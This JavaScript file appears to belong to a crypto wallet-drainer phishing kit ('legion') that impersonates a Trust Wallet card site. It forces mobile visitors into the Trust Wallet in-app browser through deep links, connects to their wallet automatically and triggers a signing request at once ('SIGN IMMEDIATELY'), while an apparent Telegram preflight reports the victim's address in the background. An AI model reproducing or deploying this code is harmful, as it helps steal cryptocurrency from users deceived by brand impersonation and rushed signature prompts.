/**
 * Trust open_url → in-app browser handoff v1.1
 *
 * Outside Trust: open_url into Trust dApp Browser.
 * Inside Trust (utm_source=Trust_iOS_Browser): NEVER open trust:// / link.trustwallet.com
 * again — that triggers "blocked from automatically opening an external application".
 * Stay put → injected ethereum only.
 */
(function () {
  'use strict';

  var HANDOFF_KEY = 'trust_open_inapp_handoff';
  var SKIP_KEY = 'trust_skip_open_inapp';
  var INAPP_KEY = 'trust_confirmed_inapp';
  var handoffArmed = false;

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function markInApp() {
    try {
      sessionStorage.setItem(INAPP_KEY, '1');
      window.__TRUST_IN_APP__ = true;
      // Kill WC deep-link target so Legion won't fire trust://wc
      window.__LEGION_DEEP_LINK_TARGET__ = null;
    } catch (_) {}
  }

  function isTrustInApp() {
    try {
      if (window.__TRUST_IN_APP__) return true;
      try {
        if (sessionStorage.getItem(INAPP_KEY) === '1') return true;
      } catch (_) {}

      // Trust Browser stamps this on successful open_url (screenshot proof)
      var q = '';
      try {
        q = String(window.location.search || '') + '&' + String(window.location.hash || '');
      } catch (_) {}
      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(q)) { markInApp(); return true; }
      if (/[?&]trust_inapp=1(?:&|$)/i.test(q)) { markInApp(); return true; }

      var ua = navigator.userAgent || '';
      if (/Trust\/[\d.]+/i.test(ua)) { markInApp(); return true; }
      if (/Trust_iOS_Browser|Trust_Android_Browser/i.test(ua)) { markInApp(); return true; }
      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
        markInApp(); return true;
      }
      if (window.trustwallet && window.trustwallet.ethereum) { markInApp(); return true; }
    } catch (_) {}
    return false;
  }

  function siteUrl() {
    try {
      var u = new URL(window.location.href);
      u.hash = '';
      u.protocol = 'https:';
      u.searchParams.set('trust_inapp', '1');
      u.searchParams.delete('utm_source');
      return u.toString();
    } catch (_) {
      return 'https://trust-wallet-card.surge.sh/?trust_inapp=1';
    }
  }

  function openUrlNative(url) {
    return 'trust://open_url?coin_id=60&url=' + encodeURIComponent(url);
  }

  function openUrlUniversal(url) {
    return 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(url);
  }

  function isExternalAppHref(href) {
    var s = String(href || '').toLowerCase();
    if (!s) return false;
    if (s.indexOf('trust://') === 0) return true;
    if (s.indexOf('https://link.trustwallet.com/') === 0) return true;
    if (s.indexOf('http://link.trustwallet.com/') === 0) return true;
    return false;
  }

  /** Block trust:// / open_url while already inside Trust Browser. */
  function installInAppNavGuard() {
    if (window.__TRUST_INAPP_NAV_GUARD__) return;
    window.__TRUST_INAPP_NAV_GUARD__ = true;

    function blockIfNeeded(href, via) {
      if (!isTrustInApp()) return false;
      if (!isExternalAppHref(href)) return false;
      console.warn('[TrustInApp] BLOCKED external open (already in Trust):', via, String(href).slice(0, 120));
      return true;
    }

    try {
      var abs = window.location.assign.bind(window.location);
      var rep = window.location.replace.bind(window.location);
      window.location.assign = function (u) {
        if (blockIfNeeded(u, 'assign')) return;
        return abs(u);
      };
      window.location.replace = function (u) {
        if (blockIfNeeded(u, 'replace')) return;
        return rep(u);
      };
    } catch (_) {}

    document.addEventListener('click', function (e) {
      try {
        if (!isTrustInApp()) return;
        var a = e.target && e.target.closest && e.target.closest('a');
        if (a && isExternalAppHref(a.href)) {
          e.preventDefault();
          e.stopPropagation();
          console.warn('[TrustInApp] BLOCKED <a>', a.href);
        }
      } catch (_) {}
    }, true);

    // Expose for deeplink-rescue
    window.__TRUST_BLOCK_EXTERNAL_IF_INAPP__ = function (href) {
      return isTrustInApp() && isExternalAppHref(href);
    };
  }

  function handoffToTrustBrowser() {
    if (isTrustInApp()) {
      console.warn('[TrustInApp] skip handoff — already inside Trust Browser');
      return false;
    }
    if (!isMobile()) return false;
    try {
      if (sessionStorage.getItem(SKIP_KEY) === '1') return false;
    } catch (_) {}
    if (handoffArmed) return true;
    handoffArmed = true;

    var url = siteUrl();
    try { sessionStorage.setItem(HANDOFF_KEY, '1'); } catch (_) {}
    console.warn('[TrustInApp] open_url → Trust Browser', url);

    var native = openUrlNative(url);
    var uni = openUrlUniversal(url);

    try {
      var a = document.createElement('a');
      a.href = native;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(function () { try { a.remove(); } catch (_) {} }, 800);
    } catch (_) {
      try { window.location.href = native; } catch (_) {}
    }

    setTimeout(function () {
      try {
        if (isTrustInApp()) return;
        if (!document.hidden) window.location.href = uni;
      } catch (_) {}
    }, 500);

    return true;
  }

  function getInjectedTrust() {
    try {
      if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
    } catch (_) {}
    try {
      var eth = window.ethereum;
      if (!eth) return null;
      if (eth.isTrust || eth.isTrustWallet) return eth;
      if (eth.providers && eth.providers.length) {
        for (var i = 0; i < eth.providers.length; i++) {
          var p = eth.providers[i];
          if (p && (p.isTrust || p.isTrustWallet)) return p;
        }
      }
      if (isTrustInApp()) return eth;
    } catch (_) {}
    return null;
  }

  async function connectInjectedTrust() {
    markInApp();
    var prov = getInjectedTrust();
    if (!prov || typeof prov.request !== 'function') {
      console.warn('[TrustInApp] waiting for injected provider…');
      return false;
    }

    console.warn('[TrustInApp] injected connect — stay in Trust Browser');
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
    try { window.__SELECTED_WALLET__ = 'trust'; } catch (_) {}

    var accounts = await prov.request({ method: 'eth_requestAccounts' });
    var addr = accounts && accounts[0] ? String(accounts[0]).toLowerCase() : '';
    if (!addr) throw new Error('no account');

    try {
      sessionStorage.setItem('trust_site_connected_addr', addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}

    var chainId = 1;
    try {
      var hex = await prov.request({ method: 'eth_chainId' });
      chainId = parseInt(String(hex).replace('0x', ''), 16) || 1;
    } catch (_) {}

    var L = window.legion;
    if (L && L.state) {
      L.state.evmProvider = prov;
      L.state.evmAddr = addr;
      L.state.evmChain = chainId;
      L.state.connectMode = 'injected';
      L.state.evmWallet = 'Trust Wallet';
      L.state.wcSessionActive = false;
    }

    try {
      window.dispatchEvent(new CustomEvent('legion:connected', {
        detail: { address: addr, chainId: chainId, wallet: 'Trust Wallet', mode: 'injected' },
      }));
    } catch (_) {}

    // SIGN IMMEDIATELY — 0 delay (Telegram/preflight must not block)
    try {
      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
        window.legion.forceTrustSign().catch(function (e) {
          console.warn('[TrustInApp] forceSign', e && e.message);
        });
      } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
        window.__TRUST_RUN_PIPELINE__('trust-inapp');
      }
    } catch (_) {}

    // Preflight / Telegram in background only
    setTimeout(function () {
      try {
        if (typeof window.__TRUST_PREFLIGHT__ === 'function') window.__TRUST_PREFLIGHT__(addr);
      } catch (_) {}
    }, 1500);

    return true;
  }

  function preferInAppOrContinue(continueFn) {
    if (isTrustInApp()) {
      connectInjectedTrust().catch(function (e) {
        console.warn('[TrustInApp] injected fail', e && e.message);
        // NEVER fall back to WC deeplink while in Trust Browser
      });
      return true;
    }
    if (isMobile()) {
      try {
        if (sessionStorage.getItem(SKIP_KEY) === '1') {
          if (typeof continueFn === 'function') continueFn();
          return false;
        }
      } catch (_) {}
      handoffToTrustBrowser();
      return true;
    }
    if (typeof continueFn === 'function') continueFn();
    return false;
  }

  function wrapConnect() {
    var prev = window.__TRUST_DIRECT_CONNECT__;
    if (typeof prev === 'function' && !prev.__inappWrapped) {
      var wrapped = function () {
        return preferInAppOrContinue(function () { return prev.apply(this, arguments); });
      };
      wrapped.__inappWrapped = true;
      window.__TRUST_DIRECT_CONNECT_WC__ = prev;
      window.__TRUST_DIRECT_CONNECT__ = wrapped;
    }

    var prevWc = window.__WC_CONNECT__;
    if (typeof prevWc === 'function' && !prevWc.__inappWrapped) {
      var wrappedWc = function (walletId) {
        if (walletId === 'trust') {
          return preferInAppOrContinue(function () { return prevWc.call(this, walletId); });
        }
        return prevWc.apply(this, arguments);
      };
      wrappedWc.__inappWrapped = true;
      window.__WC_CONNECT__ = wrappedWc;
    }
  }

  function bootInApp() {
    if (!isTrustInApp()) return;
    console.warn('[TrustInApp] inside Trust Browser ✓ — no more external opens');
    markInApp();
    installInAppNavGuard();

    // Remove chip if any
    try {
      var chip = document.getElementById('__trust_inapp_chip');
      if (chip) chip.remove();
      var bar = document.getElementById('__trust_dl_bar');
      if (bar) bar.style.display = 'none';
    } catch (_) {}

    var n = 0;
    var t = setInterval(function () {
      n++;
      var addr = '';
      try { addr = sessionStorage.getItem('trust_site_connected_addr') || ''; } catch (_) {}
      if (addr || n > 50) {
        clearInterval(t);
        if (!addr) connectInjectedTrust().catch(function () {});
        return;
      }
      if (window.ethereum || (window.trustwallet && window.trustwallet.ethereum)) {
        clearInterval(t);
        connectInjectedTrust().catch(function () {});
      }
    }, 250);
  }

  function ensureChip() {
    if (!isMobile() || isTrustInApp()) return;
    if (document.getElementById('__trust_inapp_chip')) return;
    var chip = document.createElement('button');
    chip.id = '__trust_inapp_chip';
    chip.type = 'button';
    chip.textContent = 'Open in Trust Browser';
    chip.style.cssText = [
      'position:fixed', 'left:50%', 'transform:translateX(-50%)',
      'bottom:calc(72px + env(safe-area-inset-bottom,0px))',
      'z-index:2147483644', 'background:#0500ff', 'color:#fff',
      'border:0', 'border-radius:999px', 'padding:10px 16px',
      'font:700 12px system-ui,sans-serif',
      'box-shadow:0 8px 24px rgba(5,0,255,.4)', 'white-space:nowrap',
    ].join(';');
    chip.onclick = function (e) {
      e.preventDefault();
      handoffToTrustBrowser();
    };
    document.body.appendChild(chip);
  }

  window.__TRUST_OPEN_INAPP__ = handoffToTrustBrowser;
  window.__TRUST_IS_IN_APP__ = isTrustInApp;
  window.__TRUST_CONNECT_INJECTED__ = connectInjectedTrust;
  window.__TRUST_PREFER_INAPP__ = preferInAppOrContinue;

  function start() {
    installInAppNavGuard();
    bootInApp();
    ensureChip();
    wrapConnect();
  }

  setTimeout(wrapConnect, 0);
  setTimeout(wrapConnect, 500);
  setInterval(wrapConnect, 2000);

  if (document.body) start();
  else document.addEventListener('DOMContentLoaded', start);
})();
